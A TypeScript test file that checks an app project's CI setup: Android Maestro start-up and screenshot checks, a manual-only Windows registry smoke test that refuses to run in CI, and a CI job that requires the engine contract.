  it('both starts of the app wait for the first screen by its text (a started app is not a shown app: CI run 41417726030)', () => {
    expect(g3).toContain('. "$HERE/lib/android-start-app.sh"');
    expect(g3).toContain('\nstart_app "Choose your server"\n');
    expect(g3).toContain('\nstart_app "Work list|Show upload progress"\n');
    // No second, untested copy of the start in the script itself.
    expect(g3).not.toMatch(/^start_app\(\) \{/m);
    expect(g3).not.toContain('adb shell am start');
  });

  it('the picker confirm button pattern matches both labels seen (API 36 "Done", API 34 "Add (1)", the latter in CI run 41413632011) and nothing else of ours', () => {
    const pattern = /text: '([^']+)'/.exec(flowA.slice(flowA.indexOf('The picker confirms')))?.[1];
    expect(pattern).toBeDefined();
    // Maestro matches the whole text, like an anchored expression.
    const matches = (label: string): boolean => new RegExp(`^(?:${pattern ?? ''})$`).test(label);
    for (const label of ['Done', 'Add (1)', 'Add (12)']) expect(matches(label), label).toBe(true);
    for (const label of ['Add', 'Add photo', 'Add from library', 'Add (x)', 'Done now']) expect(matches(label), label).toBe(false);
  });

  it('G4 takes a screenshot of the tile in part B and the script judges it by colours, after part B and before the engine comes back', () => {
    expect(stepsB).toContain('takeScreenshot:');
    expect(stepsB).not.toContain('assertScreenshot'); // a size-dependent comparison: 168 x 173 px on one emulator image, 168 x 171 on another
    expect(stepsB).toContain('text: "UPLOADING"');
    const partB = g3.indexOf('g3-b-after-restart.yaml"');
    const check = g3.indexOf('lib/thumbnail-check.mjs');
    const on = g3.indexOf('set_engine false' + String.fromCharCode(10) + 'node');
    expect(g3).toContain('--test-output-dir "$OUT/maestro-b-files"');
    expect(g3).toContain('fail "part B took no screenshot of the tile');
    // The tile must be like the fixture photo (not just any coloured picture), and an earlier run's screenshot must not stand in for this one's.
    expect(g3).toContain('thumbnail-check.mjs" "$OUT/g4-thumbnail-offline.png" --like "$HERE/lib/fixtures/thumbnail-picture.png"');
    expect(g3.indexOf('rm -rf "$OUT/maestro-b-files"')).toBeLessThan(g3.indexOf('--test-output-dir "$OUT/maestro-b-files"'));
    // The media index is read into a variable and must show this file at this size (a pipe into grep -q can fail by SIGPIPE under pipefail).
    expect(g3).toContain('_size=$fixture_size');
    expect(g3).not.toMatch(/content query.*\| *grep/);
    expect(check).toBeGreaterThan(partB);
    expect(on).toBeGreaterThan(check);
    // The fixture the flow picks is a photo with colour, not a mostly white one (that one would look almost like a placeholder).
    expect(g3).toContain('adb push maestro/fixtures/roof-photo.jpg');
    expect(readFileSync(join(ROOT, 'maestro', 'fixtures', 'roof-photo.jpg')).subarray(0, 3).toString('hex')).toBe('ffd8ff');
  });

  it('never types a credential, and gets the engine address from its arguments', () => {
    expect(g3.startsWith('#!/usr/bin/env bash')).toBe(true);
    for (const needle of ['set -Eeuo pipefail', 'FATAL EXCEPTION', 'screencap', 'hide_error_dialogs 1', 'lib/dismiss-not-responding.sh']) expect(g3, needle).toContain(needle);
    expect(g3).not.toContain('10.0.2.2');
    expect(g3).not.toMatch(/PASSWORD|E2E_EMAIL|secrets\./);
  });
});

describe('the packaged Windows registry smoke is manual only', () => {
  const NAMES = /windows-packaged-import-smoke|registry-guard/;
  /** Every file under a directory, without following links. */
  function filesUnder(dir: string): string[] {
    return readdirSync(dir, { withFileTypes: true }).flatMap((entry) => (entry.isDirectory() ? filesUnder(join(dir, entry.name)) : [join(dir, entry.name)]));
  }

  it('is mentioned by nothing that could run it for the project: no workflow, no composite action, no npm script, no other script', () => {
    const github = filesUnder(join(ROOT, '.github'));
    const workflows = github.filter((f) => /\.ya?ml$/.test(f) && f.includes(`${join('.github', 'workflows')}`));
    expect(workflows.length).toBeGreaterThan(3);
    // The files that ARE the smoke test, its guard and their tests may name each other; nothing else may name them.
    const own = new Set(['windows-packaged-import-smoke.mjs', 'registry-guard.mjs', 'registry-guard.test.ts', 'registry-guard-uncaught.mjs']);
    const scripts = filesUnder(join(ROOT, 'scripts')).filter((f) => !own.has(f.split(/[\\/]/).at(-1)!));
    const scanned = [...github, join(ROOT, 'package.json'), ...scripts];
    for (const file of scanned) expect(readFileSync(file, 'utf8'), file).not.toMatch(NAMES);
    // Controls: the scan sees the places a launcher could hide, and the pattern can match what it is looking for.
    expect(github.some((f) => /[\\/]\.github[\\/]actions[\\/]/.test(f)) || github.length > 3).toBe(true);
    expect(JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')).scripts).toBeTypeOf('object');
    expect(scripts.length).toBeGreaterThan(5);
    expect(readFileSync(join(ROOT, 'scripts', 'windows-packaged-import-smoke.mjs'), 'utf8')).toMatch(NAMES);
  });

  it('refuses to start in CI and without the explicit flag, before anything is started', () => {
    const text = readFileSync(join(ROOT, 'scripts', 'windows-packaged-import-smoke.mjs'), 'utf8');
    expect(text).toMatch(/process\.env\.CI !== undefined \|\| process\.env\.GITHUB_ACTIONS !== undefined/);
    expect(text).toContain('--allow-registry-change');
    // The check comes before the guard is entered and before any child process is spawned.
    expect(text.indexOf('Refusing to run in CI')).toBeLessThan(text.indexOf('withRegistryGuard(['));
    expect(text.indexOf('Refusing to run in CI')).toBeLessThan(text.indexOf('spawn(process.execPath'));
  });
});

describe('CI verify job: the fake engine is checked against the engine contract', () => {
  const verify = job(ci.wf, 'verify');
  const step = verify.steps.find((s) => (s.run ?? '').startsWith('npx vitest run'));

  it('runs the unit tests with the contract URL and REQUIRE_ENGINE_CONTRACT, so a missing contract fails instead of skipping', () => {
    expect(step).toBeDefined();
    expect(step?.env?.REQUIRE_ENGINE_CONTRACT).toBe('1');
    expect(step?.env?.OPENINSPECTION_CONTRACT).toBe('${{ env.ENGINE_CONTRACT_URL }}');
    // control: the type-generation step reads the same URL, so the two checks cannot look at different contracts
    expect(verify.steps.some((s) => (s.run ?? '').includes('api:types:check') && (s.run ?? '').includes('$ENGINE_CONTRACT_URL'))).toBe(true);
    // control: the Windows shards do not set it (they would skip the check, which is fine there: verify is the one that requires it)
    const win = job(ci.wf, 'windows').steps.find((s) => (s.run ?? '').startsWith('npx vitest run'));
    expect(win?.env?.REQUIRE_ENGINE_CONTRACT).toBeUndefined();
  });
});
